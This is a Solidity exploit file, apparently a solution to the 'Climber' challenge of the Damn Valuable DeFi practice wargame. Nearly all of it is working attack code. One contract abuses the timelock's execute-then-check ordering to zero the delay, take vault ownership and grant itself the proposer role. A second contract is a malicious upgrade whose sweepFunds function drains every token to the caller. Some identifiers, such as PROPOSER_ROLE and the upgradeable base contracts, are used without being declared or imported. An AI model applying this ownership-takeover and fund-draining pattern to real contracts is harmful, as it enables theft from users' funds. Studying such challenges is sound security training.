// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "hardhat/console.sol";

contract ClimberAttacker {

    ClimberVault vault;
    DamnValuableToken token;
    ClimberTimelock timeclock;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);

    constructor(address _vaultAddress, address _tokenAddress) {
        vault = ClimberVault(_vaultAddress);
        token = DamnValuableToken(_tokenAddress);
        timeclock = ClimberTimelock(payable(vault.owner()));
    }

    function attack() public {
        targets[0] = address(timeclock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[1] = address(vault);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);

        targets[2] = address(timeclock);
        values[2] = 0;
        // We cannot use `_setupRole` here because it is a external function call (even though the contract is calling itself).
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("timelockSchedule()");

        timeclock.execute(targets, values, dataElements, 0);
    }

    function timelockSchedule() public {
        timeclock.schedule(targets, values, dataElements, 0);
    }
}

// Upgrade original contract to this one.
contract ClimberVaultAttacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    // Sweep funds.
    function sweepFunds(address token) external {
        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
